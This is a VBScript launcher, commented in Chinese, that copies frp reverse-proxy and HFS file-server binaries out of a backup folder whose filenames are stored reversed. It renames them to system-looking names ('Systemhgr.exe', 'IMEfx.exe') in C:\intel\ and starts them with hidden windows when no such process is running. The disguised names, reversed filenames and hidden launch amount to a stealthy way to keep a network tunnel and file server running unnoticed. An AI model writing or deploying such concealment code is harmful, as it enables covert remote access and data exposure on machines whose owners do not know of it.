
Dim dir,dir_run,dir_tools,dir_frp,hfs,hfs_run,frps,frps_run,frpsini,frpsini_run
' dir是用来放frp源文件(备份),dir_run用来放hfs/frps运行程序,dir_tools是tools文件夹，dir_frp是tools\frp目录
dir_bak = "F:\frp-backup\"
dir_run = "C:\intel\"
dir_tools = "f:\tools\"
dir_frp = dir_tools & "frp\"
hfs = "sfh.exe"
frps = "46dma_swodniw_sprf.exe"
frpsini = "sprf.ini"
hfs_run = "Systemhgr.exe"
frps_run = "IMEfx.exe"
frpsini_run = "intl.ini"

Set fs = CreateObject("Scripting.FileSystemObject")

If Not fs.FolderExists(dir_tools) Then fs.CreateFolder(dir_tools) End If
If Not fs.FolderExists(dir_frp) Then fs.CreateFolder(dir_frp) End If
  Sub cpfile(sou , des)
    If Not fs.FileExists(des) Then fs.CopyFile (sou), (des) End If
  End Sub
If Not fs.FileExists(dir_run & hfs_run) Then fs.CopyFile (dir_bak & hfs), (dir_run & hfs_run) End If
If Not fs.FileExists(dir_run & frps_run) Then fs.CopyFile (dir_bak & frps), (dir_run & frps_run) End If
If Not fs.FileExists(dir_run & frpsini_run) Then fs.CopyFile (dir_bak & frpsini), (dir_run & frpsini_run) End If
On Error Resume Next
Call cpfile ((dir_bak) & "elspim_cprf",(dir_frp) & "frpc_mipsle")

fs.CopyFile (dir_bak & "elspim_cprf"), (dir_frp & "frpc_mipsle"), False
fs.CopyFile (dir_bak & "spim_cprf"), (dir_frp & "frpc_mips"), False
fs.CopyFile (dir_bak & "mra_cprf"), (dir_frp & "frpc_arm"), False
fs.CopyFile (dir_bak & "46dma_swodniw_cprf.exe"), (dir_frp & "frpc_windows_amd64.exe"), False
fs.CopyFile (dir_bak & "863_swodniw_cprf.exe"), (dir_frp & "frpc_windows_386.exe"), False
fs.CopyFile (dir_bak & "46dma_swodniw_sprf.exe"), (dir_frp & "frps_windows_amd64.exe"), False

' ------判断系统进程是否存在，存在不操作，不存在就启动程序-------------------------------
Set proc = GetObject("winmgmts:\\.\root\cimv2")
Set procfrps = proc.ExecQuery("select * from win32_process where name = 'IMEfx.exe'")
Set prochfs = proc.ExecQuery("select * from win32_process where name = 'Systemhgr.exe'")
Dim existfrps,existhfs
For Each pf In procfrps
existfrps = True 
Next
For Each ph In prochfs
existhfs = True 
Next
set obj = WScript.CreateObject("WScript.Shell")
If Not existfrps Then obj.Run "C:\intel\IMEfx.exe -c C:\intel\intl.ini", 0 End If
If Not existhfs Then obj.Run "C:\intel\Systemhgr.exe", 0 End If
